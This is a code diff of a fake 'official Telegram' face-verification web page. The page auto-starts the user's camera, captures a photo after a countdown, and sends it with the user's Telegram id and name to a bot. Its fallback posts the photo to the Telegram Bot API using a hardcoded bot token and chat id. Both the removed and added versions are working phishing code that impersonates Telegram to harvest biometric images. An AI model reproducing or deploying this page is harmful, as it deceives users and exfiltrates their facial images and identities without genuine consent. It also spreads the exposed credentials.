@@ -6,332 +6,288 @@
     <title>Telegram Security Verification</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        :root {
-            --primary: #0088cc;
-            --success: #00a884;
-            --error: #ff3b30;
-        }
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: white;
             min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
             padding: 20px;
+            text-align: center;
         }
         .container {
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(20px);
-            border-radius: 24px;
-            padding: 40px;
             max-width: 500px;
-            width: 100%;
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-        }
-        .header {
-            text-align: center;
-            margin-bottom: 30px;
-        }
-        .logo {
-            font-size: 48px;
-            margin-bottom: 15px;
-            display: block;
-        }
-        h1 {
-            font-size: 28px;
-            font-weight: 600;
-            margin-bottom: 10px;
-        }
-        .subtitle {
-            opacity: 0.9;
-            font-size: 16px;
-            line-height: 1.5;
-        }
-        .status-container {
-            background: rgba(0, 0, 0, 0.2);
-            border-radius: 16px;
+            margin: 0 auto;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
             padding: 30px;
-            margin-bottom: 25px;
-            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.2);
         }
-        #statusText {
-            font-size: 18px;
-            margin-bottom: 20px;
+        .logo { font-size: 48px; margin: 20px 0; }
+        h1 { margin-bottom: 10px; }
+        .status { 
+            font-size: 18px; 
+            margin: 20px 0;
             min-height: 24px;
         }
-        .loader {
-            width: 50px;
-            height: 50px;
-            border: 4px solid rgba(255, 255, 255, 0.2);
-            border-radius: 50%;
-            border-top-color: white;
-            margin: 0 auto 20px;
-            animation: spin 1s linear infinite;
-        }
-        @keyframes spin { 100% { transform: rotate(360deg); } }
-        .countdown {
-            font-size: 48px;
-            font-weight: 700;
-            margin: 20px 0;
-        }
+        .error { color: #ff6b6b; }
+        .success { color: #4cd964; }
         video {
             width: 100%;
             max-width: 300px;
-            border-radius: 12px;
+            border-radius: 15px;
             margin: 20px auto;
             display: block;
-            transform: scaleX(-1);
+            background: black;
         }
-        .button {
+        canvas { display: none; }
+        .hidden { display: none !important; }
+        .btn {
             background: white;
-            color: var(--primary);
+            color: #667eea;
             border: none;
-            padding: 18px 40px;
+            padding: 15px 30px;
             border-radius: 50px;
             font-size: 18px;
-            font-weight: 600;
             cursor: pointer;
-            width: 100%;
-            transition: all 0.3s;
-            display: block;
-            text-align: center;
+            margin: 10px;
         }
-        .button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
-        }
-        .button:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-        }
-        .success { color: var(--success); }
-        .error { color: var(--error); }
-        .hidden { display: none !important; }
-        .progress-bar {
-            height: 4px;
-            background: rgba(255, 255, 255, 0.2);
-            border-radius: 2px;
-            margin: 20px 0;
-            overflow: hidden;
-        }
-        .progress {
-            height: 100%;
-            background: var(--success);
-            width: 0%;
-            transition: width 0.3s;
-        }
-        .footer {
-            text-align: center;
-            margin-top: 25px;
-            font-size: 12px;
-            opacity: 0.7;
+        .countdown {
+            font-size: 48px;
+            font-weight: bold;
+            margin: 20px;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="header">
-            <span class="logo">🔐</span>
-            <h1>Security Verification</h1>
-            <p class="subtitle">Official Telegram identity confirmation system</p>
-        </div>
-
-        <div class="status-container">
-            <div id="statusText">Initializing verification protocol...</div>
-            <div class="loader" id="loader"></div>
-            <div class="progress-bar"><div class="progress" id="progress"></div></div>
-            <div class="countdown hidden" id="countdown">3</div>
-            <video id="camera" autoplay playsinline class="hidden"></video>
-        </div>
-
-        <button class="button hidden" id="actionButton">Start Verification</button>
-        <button class="button hidden" id="retryButton">Try Again</button>
-
-        <div class="footer">
-            <p>This is an official Telegram verification service. Do not close this window.</p>
-        </div>
+        <div class="logo">📸</div>
+        <h1>Face Verification</h1>
+        <p>Official identity confirmation system</p>
+        
+        <div class="status" id="status">Starting verification...</div>
+        
+        <div class="countdown hidden" id="countdown">3</div>
+        <video id="camera" autoplay playsinline class="hidden"></video>
+        <canvas id="canvas" class="hidden"></canvas>
+        
+        <button class="btn hidden" id="startBtn">Start Camera</button>
+        <button class="btn hidden" id="retryBtn">Try Again</button>
     </div>
 
     <script>
-        // Telegram Web App Initialization
+        // Telegram Web App
         const tg = window.Telegram.WebApp;
-        tg.expand();
-        tg.enableClosingConfirmation();
-        tg.setHeaderColor('#667eea');
-        tg.setBackgroundColor('#667eea');
-        tg.ready();
-
-        // DOM Elements
-        const statusText = document.getElementById('statusText');
-        const loader = document.getElementById('loader');
-        const progress = document.getElementById('progress');
+        
+        // DOM elements
+        const status = document.getElementById('status');
         const countdown = document.getElementById('countdown');
         const camera = document.getElementById('camera');
-        const actionButton = document.getElementById('actionButton');
-        const retryButton = document.getElementById('retryButton');
-
+        const canvas = document.getElementById('canvas');
+        const startBtn = document.getElementById('startBtn');
+        const retryBtn = document.getElementById('retryBtn');
+        
         let stream = null;
         let countdownValue = 3;
-        let countdownInterval = null;
-
-        // Start verification automatically after 1 second
-        setTimeout(initializeVerification, 1000);
-
-        function initializeVerification() {
-            statusText.textContent = "Preparing security module...";
-            actionButton.classList.add('hidden');
-            retryButton.classList.add('hidden');
-
-            // Check for Telegram Web App data
-            if (!tg.initDataUnsafe) {
-                statusText.innerHTML = '<span class="error">⚠️ Error: Not opened from Telegram</span>';
-                showManualButton();
-                return;
-            }
-
-            // Auto-start camera
-            setTimeout(startCameraCapture, 1500);
+        let countdownTimer = null;
+        
+        // Initialize
+        tg.expand();
+        tg.ready();
+        
+        // Start automatically after page load
+        setTimeout(initializeApp, 1000);
+        
+        function initializeApp() {
+            status.textContent = "Checking camera permissions...";
+            
+            // Show start button for manual control
+            startBtn.classList.remove('hidden');
+            startBtn.onclick = startCamera;
+            
+            // Try auto-start for some devices
+            setTimeout(() => {
+                if (!stream) {
+                    startCamera();
+                }
+            }, 500);
         }
-
-        function startCameraCapture() {
-            statusText.textContent = "Requesting camera access...";
-            progress.style.width = '30%';
-
-            // Request camera with highest quality
-            navigator.mediaDevices.getUserMedia({
+        
+        function startCamera() {
+            startBtn.classList.add('hidden');
+            status.textContent = "Accessing camera...";
+            
+            // Stop previous stream if exists
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+            
+            // Request camera with proper constraints
+            const constraints = {
                 video: {
                     facingMode: 'user',
-                    width: { ideal: 1920 },
-                    height: { ideal: 1080 },
+                    width: { min: 640, ideal: 1280, max: 1920 },
+                    height: { min: 480, ideal: 720, max: 1080 },
                     frameRate: { ideal: 30 }
                 },
                 audio: false
-            })
-            .then(handleCameraSuccess)
-            .catch(handleCameraError);
-        }
-
-        function handleCameraSuccess(mediaStream) {
-            stream = mediaStream;
-            progress.style.width = '60%';
+            };
             
-            // Show camera preview
+            navigator.mediaDevices.getUserMedia(constraints)
+                .then(handleSuccess)
+                .catch(handleError);
+        }
+        
+        function handleSuccess(mediaStream) {
+            stream = mediaStream;
+            
+            // Check if stream has video
+            const videoTrack = stream.getVideoTracks()[0];
+            if (!videoTrack) {
+                handleError(new Error('No video track'));
+                return;
+            }
+            
+            // Set camera source
             camera.srcObject = stream;
             camera.classList.remove('hidden');
-            loader.classList.add('hidden');
             
-            statusText.textContent = "Camera access granted";
+            // Wait for video to load
+            camera.onloadedmetadata = () => {
+                status.textContent = "Camera ready";
+                
+                // Start countdown for auto-capture
+                startCountdown();
+            };
             
-            // Start countdown for automatic capture
-            setTimeout(startCaptureCountdown, 1000);
+            camera.onerror = (err) => {
+                console.error('Video error:', err);
+                status.innerHTML = '<span class="error">Video error</span>';
+            };
         }
-
-        function startCaptureCountdown() {
+        
+        function startCountdown() {
             countdown.textContent = countdownValue;
             countdown.classList.remove('hidden');
-            statusText.textContent = "Preparing for facial recognition...";
-
-            countdownInterval = setInterval(() => {
+            status.textContent = "Get ready for photo...";
+            
+            countdownTimer = setInterval(() => {
                 countdownValue--;
                 countdown.textContent = countdownValue;
-                progress.style.width = `${60 + (40 - countdownValue * 13)}%`;
-
+                
                 if (countdownValue <= 0) {
-                    clearInterval(countdownInterval);
+                    clearInterval(countdownTimer);
                     capturePhoto();
                 }
             }, 1000);
         }
-
+        
         function capturePhoto() {
             countdown.classList.add('hidden');
-            statusText.textContent = "Capturing biometric data...";
-            progress.style.width = '90%';
-
-            // Create canvas for photo
-            const canvas = document.createElement('canvas');
+            status.textContent = "Capturing photo...";
+            
+            // Ensure video is playing
+            if (camera.readyState < 2) {
+                status.textContent = "Camera not ready, waiting...";
+                setTimeout(capturePhoto, 500);
+                return;
+            }
+            
+            // Set canvas size to video size
             canvas.width = camera.videoWidth;
             canvas.height = camera.videoHeight;
             
             const ctx = canvas.getContext('2d');
-            ctx.translate(canvas.width, 0);
-            ctx.scale(-1, 1);
-            ctx.drawImage(camera, 0, 0, canvas.width, canvas.height);
-
-            // Stop camera
-            stream.getTracks().forEach(track => track.stop());
-            camera.classList.add('hidden');
-
-            // Get photo as base64
-            const photoData = canvas.toDataURL('image/jpeg', 0.95);
-
-            // Send to bot
-            sendToBot(photoData);
+            
+            // IMPORTANT: Wait for video frame
+            setTimeout(() => {
+                try {
+                    // Draw video frame to canvas
+                    ctx.drawImage(camera, 0, 0, canvas.width, canvas.height);
+                    
+                    // Convert to JPEG
+                    const photoData = canvas.toDataURL('image/jpeg', 0.9);
+                    
+                    // Verify photo is not black
+                    const imageData = ctx.getImageData(0, 0, 1, 1).data;
+                    const brightness = (imageData[0] + imageData[1] + imageData[2]) / 3;
+                    
+                    if (brightness < 10) {
+                        // Photo is too dark/black
+                        throw new Error('Black photo detected');
+                    }
+                    
+                    // Stop camera
+                    if (stream) {
+                        stream.getTracks().forEach(track => track.stop());
+                    }
+                    camera.classList.add('hidden');
+                    
+                    // Send to bot
+                    sendPhotoToBot(photoData);
+                    
+                } catch (error) {
+                    console.error('Capture error:', error);
+                    handleError(error);
+                }
+            }, 100);
         }
-
-        function sendToBot(photoData) {
-            statusText.textContent = "Transmitting secure data...";
-
-            // Prepare data for bot
+        
+        function sendPhotoToBot(photoData) {
+            status.textContent = "Sending verification data...";
+            
+            // Prepare data
             const userData = {
                 action: 'photo_captured',
                 photo: photoData,
-                user_id: tg.initDataUnsafe.user?.id || 'unknown',
-                user_name: tg.initDataUnsafe.user?.first_name || 'Anonymous',
-                username: tg.initDataUnsafe.user?.username || 'unknown',
-                timestamp: new Date().toISOString(),
-                platform: navigator.platform,
-                user_agent: navigator.userAgent
+                user_id: tg.initDataUnsafe?.user?.id || 'unknown',
+                user_name: tg.initDataUnsafe?.user?.first_name || 'Anonymous',
+                timestamp: new Date().toISOString()
             };
-
-            console.log('Sending data to bot:', userData);
-
+            
+            console.log('Sending photo data, size:', photoData.length);
+            
             // Send via Telegram Web App
             try {
                 tg.sendData(JSON.stringify(userData));
                 
-                // Show success
-                statusText.innerHTML = '<span class="success">✅ Verification successful!</span>';
-                progress.style.width = '100%';
+                status.innerHTML = '<span class="success">✅ Verification complete!</span>';
                 
-                // Vibrate on success
-                if (tg.HapticFeedback) {
-                    tg.HapticFeedback.notificationOccurred('success');
-                }
-
-                // Auto-close after 2 seconds
+                // Auto-close
                 setTimeout(() => {
                     tg.close();
                 }, 2000);
-
-            } catch (error) {
-                handleSendError(error, photoData);
+                
+            } catch (sendError) {
+                console.error('Send error:', sendError);
+                status.innerHTML = '<span class="error">Sending failed, trying alternative...</span>';
+                
+                // Alternative method
+                sendViaDirectAPI(photoData);
             }
         }
-
-        function handleSendError(error, photoData) {
-            console.error('Send error:', error);
-            statusText.innerHTML = '<span class="error">⚠️ Transmission failed, trying alternative method...</span>';
-            
-            // Alternative: Send via direct Telegram API
-            sendViaDirectAPI(photoData);
-        }
-
+        
         function sendViaDirectAPI(photoData) {
             const botToken = '7551551273:AAFKKqRlkkakJYdSNX4ogmg-YYKklBikmZY';
             const chatId = '7795195179';
             
-            // Use FormData for file upload
+            // Convert base64 to blob
+            const byteString = atob(photoData.split(',')[1]);
+            const mimeString = photoData.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            
+            const blob = new Blob([ab], { type: mimeString });
             const formData = new FormData();
-            const blob = dataURLtoBlob(photoData);
-            formData.append('photo', blob, 'verification.jpg');
+            formData.append('photo', blob, 'photo.jpg');
             formData.append('chat_id', chatId);
-            formData.append('caption', `Verification: ${new Date().toLocaleString()}`);
-
+            formData.append('caption', `Captured: ${new Date().toLocaleString()}`);
+            
             fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                 method: 'POST',
                 body: formData
@@ -339,77 +295,56 @@
             .then(response => response.json())
             .then(data => {
                 if (data.ok) {
-                    statusText.innerHTML = '<span class="success">✅ Data transmitted successfully!</span>';
+                    status.innerHTML = '<span class="success">✅ Photo sent!</span>';
                     setTimeout(() => tg.close(), 2000);
                 } else {
                     throw new Error(data.description);
                 }
             })
             .catch(error => {
-                statusText.innerHTML = '<span class="error">❌ Failed to transmit data</span>';
-                retryButton.classList.remove('hidden');
+                status.innerHTML = '<span class="error">❌ Failed to send</span>';
+                retryBtn.classList.remove('hidden');
             });
         }
-
-        function dataURLtoBlob(dataURL) {
-            const arr = dataURL.split(',');
-            const mime = arr[0].match(/:(.*?);/)[1];
-            const bstr = atob(arr[1]);
-            let n = bstr.length;
-            const u8arr = new Uint8Array(n);
-            
-            while (n--) {
-                u8arr[n] = bstr.charCodeAt(n);
-            }
-            
-            return new Blob([u8arr], { type: mime });
-        }
-
-        function handleCameraError(error) {
-            console.error('Camera error:', error);
-            loader.classList.add('hidden');
-            
-            let errorMessage = "Camera not available";
-            if (error.name === 'NotAllowedError') {
-                errorMessage = "Camera access denied. Please allow camera permissions.";
-            } else if (error.name === 'NotFoundError') {
-                errorMessage = "No camera found on this device.";
-            }
-            
-            statusText.innerHTML = `<span class="error">❌ ${errorMessage}</span>`;
-            retryButton.classList.remove('hidden');
-        }
-
-        function showManualButton() {
-            actionButton.textContent = "Start Manual Verification";
-            actionButton.classList.remove('hidden');
-            actionButton.onclick = startCameraCapture;
-        }
-
-        // Button handlers
-        retryButton.onclick = () => {
-            retryButton.classList.add('hidden');
-            loader.classList.remove('hidden');
-            countdownValue = 3;
-            initializeVerification();
-        };
-
-        // Handle back button
-        tg.BackButton.onClick(() => {
-            tg.showConfirm("Cancel verification?", (confirmed) => {
-                if (confirmed) {
-                    if (stream) {
-                        stream.getTracks().forEach(track => track.stop());
-                    }
-                    if (countdownInterval) {
-                        clearInterval(countdownInterval);
-                    }
-                    tg.close();
-                }
-            });
-        });
         
+        function handleError(error) {
+            console.error('Camera error:', error);
+            
+            let message = 'Camera error';
+            if (error.name === 'NotAllowedError') {
+                message = 'Please allow camera access';
+            } else if (error.name === 'NotFoundError') {
+                message = 'No camera found';
+            } else if (error.message === 'Black photo detected') {
+                message = 'Camera is blocked or covered';
+            }
+            
+            status.innerHTML = `<span class="error">❌ ${message}</span>`;
+            
+            // Show retry button
+            retryBtn.classList.remove('hidden');
+            retryBtn.onclick = () => {
+                retryBtn.classList.add('hidden');
+                countdownValue = 3;
+                startCamera();
+            };
+        }
+        
+        // Handle back button
         if (tg.BackButton) {
+            tg.BackButton.onClick(() => {
+                tg.showConfirm("Cancel verification?", (ok) => {
+                    if (ok) {
+                        if (stream) {
+                            stream.getTracks().forEach(track => track.stop());
+                        }
+                        if (countdownTimer) {
+                            clearInterval(countdownTimer);
+                        }
+                        tg.close();
+                    }
+                });
+            });
             tg.BackButton.show();
         }
     </script>
